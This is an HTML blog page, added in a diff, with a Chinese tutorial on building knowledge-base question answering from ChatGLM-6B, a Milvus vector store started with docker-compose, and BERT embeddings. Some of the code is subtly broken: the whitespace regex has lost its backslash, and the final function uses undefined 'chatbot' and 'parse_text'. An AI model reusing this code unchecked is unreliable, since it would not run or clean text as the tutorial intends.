@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<title>chatglm实现基于知识库问答的应用 - 编程小白</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程小白" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程小白</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">chatglm实现基于知识库问答的应用</h1>
+			
+		</header>
+		<div class="content post__content clearfix">
+			
+
+
+        
+                <div id="content_views" class="markdown_views prism-atom-one-light">
+                    
+                        
+                    
+                    <h1>
+<a id="_0"></a>背景</h1> 
+<p>目前由于ChatGPT横空出世，互联网如雨后春笋冒出了非常多的类ChatGPT的大型语言模型。但是对于这些语言模型，我们应该如何将它应用到我们实际的生产中需要一个更加成熟的解决方案。</p> 
+<h1>
+<a id="_2"></a>介绍</h1> 
+<p>本文旨在通过介绍ChatGLM的使用来讲述如何将一个开源的语言模型应用于智能问答，知识库问答的场景中，通过一系列实操例子来理解整个应用思路。</p> 
+<h1>
+<a id="_4"></a>前期准备</h1> 
+<ul>
+<li>一个开源语言模型，这里推荐<a href="https://github.com/THUDM/ChatGLM-6B">ChatGLM-6B</a>，开源的、支持中英双语的对话语言模型，并且要求的显存内存非常低，可以在个人PC中轻松部署。</li>
+<li>python3.8+</li>
+<li>milvus，向量索引库</li>
+<li>pytorch以及运行ChatGLM-6B所需要的CUDA和NVIDIA驱动</li>
+<li>…</li>
+</ul> 
+<h1>
+<a id="_11"></a>基于文档的知识库问答</h1> 
+<h2>
+<a id="_12"></a>实现步骤</h2> 
+<ol>
+<li>清洗知识库文档，将文档向量化并存入向量数据库</li>
+<li>用户提问</li>
+<li>将用户提问向量化并查询向量数据库得到匹配的N条知识</li>
+<li>将匹配的知识构建prompt，并通过langchain处理用户的问题</li>
+<li>调用llm搭配prompt回答用户的问题</li>
+</ol> 
+<h2>
+<a id="_18"></a>向量索引</h2> 
+<p>我们首先需要定义一个向量索引库，在这里我选用的是<code>milvus</code>作为向量索引库来实现我们的文档向量索引和相似度匹配的工作</p> 
+<p>为了更方便的部署，这里我采用了<code>docker-compose</code>来启动<code>milvus</code>服务。</p> 
+<p>大家可以在<code>milvus</code>的官方文档中看到最新版本的部署方式<a href="https://milvus.io/docs/install_standalone-docker.md">Install Milvus Standalone with Docker Compose</a><br> 嫌麻烦也可以直接复制使用下面的yaml文件</p> 
+<pre><code class="prism language-yaml"><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">'3.5'</span>
+
+<span class="token key atrule">services</span><span class="token punctuation">:</span>
+  <span class="token key atrule">etcd</span><span class="token punctuation">:</span>
+    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> milvus<span class="token punctuation">-</span>etcd
+    <span class="token key atrule">image</span><span class="token punctuation">:</span> quay.io/coreos/etcd<span class="token punctuation">:</span>v3.5.0
+    <span class="token key atrule">environment</span><span class="token punctuation">:</span>
+      <span class="token punctuation">-</span> ETCD_AUTO_COMPACTION_MODE=revision
+      <span class="token punctuation">-</span> ETCD_AUTO_COMPACTION_RETENTION=1000
+      <span class="token punctuation">-</span> ETCD_QUOTA_BACKEND_BYTES=4294967296
+      <span class="token punctuation">-</span> ETCD_SNAPSHOT_COUNT=50000
+    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>
+      <span class="token punctuation">-</span> $<span class="token punctuation">{<!-- --></span>DOCKER_VOLUME_DIRECTORY<span class="token punctuation">:</span><span class="token punctuation">-</span>.<span class="token punctuation">}</span>/volumes/etcd<span class="token punctuation">:</span>/etcd
+    <span class="token key atrule">command</span><span class="token punctuation">:</span> etcd <span class="token punctuation">-</span>advertise<span class="token punctuation">-</span>client<span class="token punctuation">-</span>urls=http<span class="token punctuation">:</span>//127.0.0.1<span class="token punctuation">:</span>2379 <span class="token punctuation">-</span>listen<span class="token punctuation">-</span>client<span class="token punctuation">-</span>urls http<span class="token punctuation">:</span>//0.0.0.0<span class="token punctuation">:</span>2379 <span class="token punctuation">-</span><span class="token punctuation">-</span>data<span class="token punctuation">-</span>dir /etcd
+
+  <span class="token key atrule">minio</span><span class="token punctuation">:</span>
+    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> milvus<span class="token punctuation">-</span>minio
+    <span class="token key atrule">image</span><span class="token punctuation">:</span> minio/minio<span class="token punctuation">:</span>RELEASE.2023<span class="token punctuation">-</span>03<span class="token punctuation">-</span>20T20<span class="token punctuation">-</span>16<span class="token punctuation">-</span>18Z
+    <span class="token key atrule">environment</span><span class="token punctuation">:</span>
+      <span class="token key atrule">MINIO_ACCESS_KEY</span><span class="token punctuation">:</span> minioadmin
+      <span class="token key atrule">MINIO_SECRET_KEY</span><span class="token punctuation">:</span> minioadmin
+    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>
+      <span class="token punctuation">-</span> $<span class="token punctuation">{<!-- --></span>DOCKER_VOLUME_DIRECTORY<span class="token punctuation">:</span><span class="token punctuation">-</span>.<span class="token punctuation">}</span>/volumes/minio<span class="token punctuation">:</span>/minio_data
+    <span class="token key atrule">command</span><span class="token punctuation">:</span> minio server /minio_data
+    <span class="token key atrule">healthcheck</span><span class="token punctuation">:</span>
+      <span class="token key atrule">test</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"CMD"</span><span class="token punctuation">,</span> <span class="token string">"curl"</span><span class="token punctuation">,</span> <span class="token string">"-f"</span><span class="token punctuation">,</span> <span class="token string">"http://localhost:9000/minio/health/live"</span><span class="token punctuation">]</span>
+      <span class="token key atrule">interval</span><span class="token punctuation">:</span> 30s
+      <span class="token key atrule">timeout</span><span class="token punctuation">:</span> 20s
+      <span class="token key atrule">retries</span><span class="token punctuation">:</span> <span class="token number">3</span>
+
+  <span class="token key atrule">standalone</span><span class="token punctuation">:</span>
+    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> milvus<span class="token punctuation">-</span>standalone
+    <span class="token key atrule">image</span><span class="token punctuation">:</span> milvusdb/milvus<span class="token punctuation">:</span>v2.2.5
+    <span class="token key atrule">command</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"milvus"</span><span class="token punctuation">,</span> <span class="token string">"run"</span><span class="token punctuation">,</span> <span class="token string">"standalone"</span><span class="token punctuation">]</span>
+    <span class="token key atrule">environment</span><span class="token punctuation">:</span>
+      <span class="token key atrule">ETCD_ENDPOINTS</span><span class="token punctuation">:</span> etcd<span class="token punctuation">:</span><span class="token number">2379</span>
+      <span class="token key atrule">MINIO_ADDRESS</span><span class="token punctuation">:</span> minio<span class="token punctuation">:</span><span class="token number">9000</span>
+    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>
+      <span class="token punctuation">-</span> $<span class="token punctuation">{<!-- --></span>DOCKER_VOLUME_DIRECTORY<span class="token punctuation">:</span><span class="token punctuation">-</span>.<span class="token punctuation">}</span>/volumes/milvus<span class="token punctuation">:</span>/var/lib/milvus
+    <span class="token key atrule">ports</span><span class="token punctuation">:</span>
+      <span class="token punctuation">-</span> <span class="token string">"19530:19530"</span>
+      <span class="token punctuation">-</span> <span class="token string">"9091:9091"</span>
+    <span class="token key atrule">depends_on</span><span class="token punctuation">:</span>
+      <span class="token punctuation">-</span> <span class="token string">"etcd"</span>
+      <span class="token punctuation">-</span> <span class="token string">"minio"</span>
+
+<span class="token key atrule">networks</span><span class="token punctuation">:</span>
+  <span class="token key atrule">default</span><span class="token punctuation">:</span>
+    <span class="token key atrule">name</span><span class="token punctuation">:</span> milvus
+</code></pre> 
+<p>当我们创建好<code>docker-compose.yml</code>文件之后就可以使用命令行<code>docker-compose up -d</code>来启动<code>milvus</code>服务。</p> 
+<p>接下来就是文档预处理</p> 
+<h2>
+<a id="_79"></a>文档预处理</h2> 
+<p>当我们收集到足够的文档之后，我们需要对文档进行一些清洗，方便我们之后的向量匹配更加精准。<br> 这里，我们需要完成以下步骤：</p> 
+<ol>
+<li>连接<code>milvus</code>向量库</li>
+<li>创建对应的connection</li>
+<li>遍历读取文档</li>
+<li>文档预处理</li>
+<li>文档内容转向量</li>
+<li>存入向量库</li>
+</ol> 
+<p>为此，我们编写代码如下</p> 
+<pre><code class="prism language-python"><span class="token keyword">import</span> os
+<span class="token keyword">import</span> re
+<span class="token keyword">import</span> jieba
+<span class="token keyword">import</span> torch
+<span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd
+<span class="token keyword">from</span> pymilvus <span class="token keyword">import</span> utility
+<span class="token keyword">from</span> pymilvus <span class="token keyword">import</span> connections<span class="token punctuation">,</span> CollectionSchema<span class="token punctuation">,</span> FieldSchema<span class="token punctuation">,</span> Collection<span class="token punctuation">,</span> DataType
+<span class="token keyword">from</span> transformers <span class="token keyword">import</span> AutoTokenizer<span class="token punctuation">,</span> AutoModel
+
+connections<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>
+    alias<span class="token operator">=</span><span class="token string">"default"</span><span class="token punctuation">,</span>
+    host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span>
+    port<span class="token operator">=</span><span class="token string">'19530'</span>
+<span class="token punctuation">)</span>
+
+<span class="token comment"># 定义集合名称和维度</span>
+collection_name <span class="token operator">=</span> <span class="token string">"document"</span>
+dimension <span class="token operator">=</span> <span class="token number">768</span>
+docs_folder <span class="token operator">=</span> <span class="token string">"./knowledge/"</span>
+
+tokenizer <span class="token operator">=</span> AutoTokenizer<span class="token punctuation">.</span>from_pretrained<span class="token punctuation">(</span><span class="token string">"bert-base-chinese"</span><span class="token punctuation">)</span>
+model <span class="token operator">=</span> AutoModel<span class="token punctuation">.</span>from_pretrained<span class="token punctuation">(</span><span class="token string">"bert-base-chinese"</span><span class="token punctuation">)</span>
+
+
+<span class="token comment"># 获取文本的向量</span>
+<span class="token keyword">def</span> <span class="token function">get_vector</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    input_ids <span class="token operator">=</span> tokenizer<span class="token punctuation">(</span>text<span class="token punctuation">,</span> padding<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> truncation<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> return_tensors<span class="token operator">=</span><span class="token string">"pt"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"input_ids"</span><span class="token punctuation">]</span>
+    <span class="token keyword">with</span> torch<span class="token punctuation">.</span>no_grad<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        output <span class="token operator">=</span> model<span class="token punctuation">(</span>input_ids<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>numpy<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> output<span class="token punctuation">.</span>tolist<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+
+
+<span class="token keyword">def</span> <span class="token function">create_collection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment"># 定义集合字段</span>
+    fields <span class="token operator">=</span> <span class="token punctuation">[</span>
+        FieldSchema<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">"id"</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>DataType<span class="token punctuation">.</span>INT64<span class="token punctuation">,</span> is_primary<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> auto_id<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> description<span class="token operator">=</span><span class="token string">"primary id"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+        FieldSchema<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">"title"</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>DataType<span class="token punctuation">.</span>VARCHAR<span class="token punctuation">,</span> max_length<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+        FieldSchema<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">"content"</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>DataType<span class="token punctuation">.</span>VARCHAR<span class="token punctuation">,</span> max_length<span class="token operator">=</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+        FieldSchema<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">"vector"</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>DataType<span class="token punctuation">.</span>FLOAT_VECTOR<span class="token punctuation">,</span> dim<span class="token operator">=</span>dimension<span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token punctuation">]</span>
+
+    <span class="token comment"># 定义集合模式</span>
+    schema <span class="token operator">=</span> CollectionSchema<span class="token punctuation">(</span>fields<span class="token operator">=</span>fields<span class="token punctuation">,</span> description<span class="token operator">=</span><span class="token string">"collection schema"</span><span class="token punctuation">)</span>
+
+    <span class="token comment"># 创建集合</span>
+
+    <span class="token keyword">if</span> utility<span class="token punctuation">.</span>has_collection<span class="token punctuation">(</span>collection_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    	<span class="token comment"># 如果你想继续添加新的文档可以直接 return。但你想要重新创建collection，就可以执行下面的代码</span>
+        <span class="token comment"># return</span>
+        utility<span class="token punctuation">.</span>drop_collection<span class="token punctuation">(</span>collection_name<span class="token punctuation">)</span>
+        collection <span class="token operator">=</span> Collection<span class="token punctuation">(</span>name<span class="token operator">=</span>collection_name<span class="token punctuation">,</span> schema<span class="token operator">=</span>schema<span class="token punctuation">,</span> using<span class="token operator">=</span><span class="token string">'default'</span><span class="token punctuation">,</span> shards_num<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>
+        <span class="token comment"># 创建索引</span>
+        default_index <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">"index_type"</span><span class="token punctuation">:</span> <span class="token string">"IVF_FLAT"</span><span class="token punctuation">,</span> <span class="token string">"params"</span><span class="token punctuation">:</span> <span class="token punctuation">{<!-- --></span><span class="token string">"nlist"</span><span class="token punctuation">:</span> <span class="token number">2048</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">"metric_type"</span><span class="token punctuation">:</span> <span class="token string">"IP"</span><span class="token punctuation">}</span>
+        collection<span class="token punctuation">.</span>create_index<span class="token punctuation">(</span>field_name<span class="token operator">=</span><span class="token string">"vector"</span><span class="token punctuation">,</span> index_params<span class="token operator">=</span>default_index<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Collection </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>collection_name<span class="token punctuation">}</span></span><span class="token string"> created successfully"</span></span><span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        collection <span class="token operator">=</span> Collection<span class="token punctuation">(</span>name<span class="token operator">=</span>collection_name<span class="token punctuation">,</span> schema<span class="token operator">=</span>schema<span class="token punctuation">,</span> using<span class="token operator">=</span><span class="token string">'default'</span><span class="token punctuation">,</span> shards_num<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>
+        <span class="token comment"># 创建索引</span>
+        default_index <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">"index_type"</span><span class="token punctuation">:</span> <span class="token string">"IVF_FLAT"</span><span class="token punctuation">,</span> <span class="token string">"params"</span><span class="token punctuation">:</span> <span class="token punctuation">{<!-- --></span><span class="token string">"nlist"</span><span class="token punctuation">:</span> <span class="token number">2048</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">"metric_type"</span><span class="token punctuation">:</span> <span class="token string">"IP"</span><span class="token punctuation">}</span>
+        collection<span class="token punctuation">.</span>create_index<span class="token punctuation">(</span>field_name<span class="token operator">=</span><span class="token string">"vector"</span><span class="token punctuation">,</span> index_params<span class="token operator">=</span>default_index<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Collection </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>collection_name<span class="token punctuation">}</span></span><span class="token string"> created successfully"</span></span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">init_knowledge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    collection <span class="token operator">=</span> Collection<span class="token punctuation">(</span>collection_name<span class="token punctuation">)</span>
+    <span class="token comment"># 遍历指定目录下的所有文件，并导入到 Milvus 集合中</span>
+    docs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> root<span class="token punctuation">,</span> dirs<span class="token punctuation">,</span> files <span class="token keyword">in</span> os<span class="token punctuation">.</span>walk<span class="token punctuation">(</span>docs_folder<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> files<span class="token punctuation">:</span>
+            <span class="token comment"># 只处理以 .txt 结尾的文本文件</span>
+            <span class="token keyword">if</span> <span class="token builtin">file</span><span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">".txt"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                file_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>root<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">)</span>
+                <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+                    content <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                <span class="token comment"># 对文本进行清洗处理</span>
+                content <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r"s+"</span><span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>
+                title <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>splitext<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+                <span class="token comment"># 分词</span>
+                words <span class="token operator">=</span> jieba<span class="token punctuation">.</span>lcut<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+                <span class="token comment"># 将分词后的文本重新拼接成字符串</span>
+                content <span class="token operator">=</span> <span class="token string">" "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>words<span class="token punctuation">)</span>
+                <span class="token comment"># 获取文本向量</span>
+                vector <span class="token operator">=</span> get_vector<span class="token punctuation">(</span>title <span class="token operator">+</span> content<span class="token punctuation">)</span>
+                docs<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span><span class="token string">"title"</span><span class="token punctuation">:</span> title<span class="token punctuation">,</span> <span class="token string">"content"</span><span class="token punctuation">:</span> content<span class="token punctuation">,</span> <span class="token string">"vector"</span><span class="token punctuation">:</span> vector<span class="token punctuation">}</span><span class="token punctuation">)</span>
+
+    <span class="token comment"># 将文本内容和向量通过 DataFrame 一起导入集合中</span>
+    df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>docs<span class="token punctuation">)</span>
+    collection<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>df<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Documents inserted successfully"</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    create_collection<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    init_knowledge<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+</code></pre> 
+<p>可以看到，我们创建了一个名为<code>document</code>的collection。它包含四个字段<code>id</code>，<code>title</code>，<code>content</code>，<code>vector</code>其中<code>vector</code>储存的是<code>content</code>转化的向量。（<em>当然，我们只是简单的实现了一个最原始的向量索引，如果你想要之后的匹配更加精准更加高效，你可以考虑将大文档按照段落切割并分别转化为向量，并且相互关联上。</em>）</p> 
+<p>于此同时，我们采用了jieba作为分词库，对文本进行清洗，还使用了正则去除了文档中不必要的一些特殊符号。这些操作可以让我们向量匹配更加精准。</p> 
+<p>当这些步骤全部执行完毕之后，我们就可以进行用户提问匹配向量库的操作了。</p> 
+<h2>
+<a id="_192"></a>用户提问匹配知识库</h2> 
+<p>首先，我们需要将用户提供的查询向量转换为blob对象，以便与数据库中的向量进行比较。我们在上个步骤实现了<code>get_vector</code>方法来将文本转为向量，现在可以继续调用该方法来实现。</p> 
+<p>其次我们需要将问题转化的向量用来查找向量库，并得出最为匹配的几个结果。编写代码如下：</p> 
+<pre><code class="prism language-python"><span class="token keyword">import</span> torch
+<span class="token keyword">from</span> document_preprocess <span class="token keyword">import</span> get_vector
+<span class="token keyword">from</span> pymilvus <span class="token keyword">import</span> Collection
+
+collection <span class="token operator">=</span> Collection<span class="token punctuation">(</span><span class="token string">"document"</span><span class="token punctuation">)</span>  <span class="token comment"># Get an existing collection.</span>
+collection<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>
+DEVICE <span class="token operator">=</span> <span class="token string">"cuda"</span> <span class="token keyword">if</span> torch<span class="token punctuation">.</span>cuda<span class="token punctuation">.</span>is_available<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token string">"mps"</span> <span class="token keyword">if</span> torch<span class="token punctuation">.</span>backends<span class="token punctuation">.</span>mps<span class="token punctuation">.</span>is_available<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token string">"cpu"</span>
+
+
+<span class="token comment"># 定义查询函数</span>
+<span class="token keyword">def</span> <span class="token function">search_similar_text</span><span class="token punctuation">(</span>input_text<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment"># 将输入文本转换为向量</span>
+    input_vector <span class="token operator">=</span> get_vector<span class="token punctuation">(</span>input_text<span class="token punctuation">)</span>
+	<span class="token comment"># 查询前三个最匹配的向量ID</span>
+    similarity <span class="token operator">=</span> collection<span class="token punctuation">.</span>search<span class="token punctuation">(</span>
+        data<span class="token operator">=</span><span class="token punctuation">[</span>input_vector<span class="token punctuation">]</span><span class="token punctuation">,</span>
+        anns_field<span class="token operator">=</span><span class="token string">"vector"</span><span class="token punctuation">,</span>
+        param<span class="token operator">=</span><span class="token punctuation">{<!-- --></span><span class="token string">"metric_type"</span><span class="token punctuation">:</span> <span class="token string">"IP"</span><span class="token punctuation">,</span> <span class="token string">"params"</span><span class="token punctuation">:</span> <span class="token punctuation">{<!-- --></span><span class="token string">"nprobe"</span><span class="token punctuation">:</span> <span class="token number">10</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">"offset"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
+        limit<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span>
+        expr<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>
+        consistency_level<span class="token operator">=</span><span class="token string">"Strong"</span>
+    <span class="token punctuation">)</span>
+    ids <span class="token operator">=</span> similarity<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ids
+    <span class="token comment"># 通过ID查询出对应的知识库文档</span>
+    res <span class="token operator">=</span> collection<span class="token punctuation">.</span>query<span class="token punctuation">(</span>
+        expr<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"id in </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>ids<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">,</span>
+        offset<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
+        limit<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span>
+        output_fields<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">,</span> <span class="token string">"content"</span><span class="token punctuation">,</span> <span class="token string">"title"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+        consistency_level<span class="token operator">=</span><span class="token string">"Strong"</span>
+    <span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> res
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+	question <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'Please enter your question: '</span><span class="token punctuation">)</span>
+    search_similar_text<span class="token punctuation">(</span>question<span class="token punctuation">)</span>
+
+</code></pre> 
+<p>上面我们通过向量索引库计算查询出了与问题最为接近的文档并打印了出来，接下来就到了最终的获取模型回答的环节了。</p> 
+<h2>
+<a id="_238"></a>通过提示模板获取准确回答</h2> 
+<p>在这一步，我们需要加载<code>ChatGLM</code>的预训练模型，并获取回答。</p> 
+<pre><code class="prism language-python"><span class="token keyword">from</span> transformers <span class="token keyword">import</span> AutoModel<span class="token punctuation">,</span> AutoTokenizer
+<span class="token keyword">from</span> knowledge_query <span class="token keyword">import</span> search_similar_text
+
+
+tokenizer <span class="token operator">=</span> AutoTokenizer<span class="token punctuation">.</span>from_pretrained<span class="token punctuation">(</span><span class="token string">"THUDM/chatglm-6b-int4"</span><span class="token punctuation">,</span> trust_remote_code<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+model <span class="token operator">=</span> AutoModel<span class="token punctuation">.</span>from_pretrained<span class="token punctuation">(</span><span class="token string">"THUDM/chatglm-6b-int4"</span><span class="token punctuation">,</span> trust_remote_code<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>half<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>cuda<span class="token punctuation">(</span><span class="token punctuation">)</span>
+model <span class="token operator">=</span> model<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">predict</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">,</span> max_length<span class="token operator">=</span><span class="token number">2048</span><span class="token punctuation">,</span> top_p<span class="token operator">=</span><span class="token number">0.7</span><span class="token punctuation">,</span> temperature<span class="token operator">=</span><span class="token number">0.95</span><span class="token punctuation">,</span> history<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	res <span class="token operator">=</span> search_similar_text<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span>
+	prompt_template <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""基于以下已知信息，简洁和专业的来回答用户的问题。
+如果无法从中得到答案，请说 "当前会话仅支持解决一个类型的问题，请清空历史信息重试"，不允许在答案中添加编造成分，答案请使用中文。
+
+已知内容:
+</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>res<span class="token punctuation">}</span></span><span class="token string">
+
+问题:
+</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token builtin">input</span><span class="token punctuation">}</span></span><span class="token string">
+"""</span></span>
+	query <span class="token operator">=</span> prompt_template
+	<span class="token keyword">for</span> response<span class="token punctuation">,</span> history <span class="token keyword">in</span> model<span class="token punctuation">.</span>stream_chat<span class="token punctuation">(</span>tokenizer<span class="token punctuation">,</span> query<span class="token punctuation">,</span> history<span class="token punctuation">,</span> max_length<span class="token operator">=</span>max_length<span class="token punctuation">,</span> top_p<span class="token operator">=</span>top_p<span class="token punctuation">,</span>
+	                                           temperature<span class="token operator">=</span>temperature<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	    chatbot<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>parse_text<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span><span class="token punctuation">,</span> parse_text<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">)</span>
+	
+	    <span class="token keyword">yield</span> chatbot<span class="token punctuation">,</span> history
+</code></pre> 
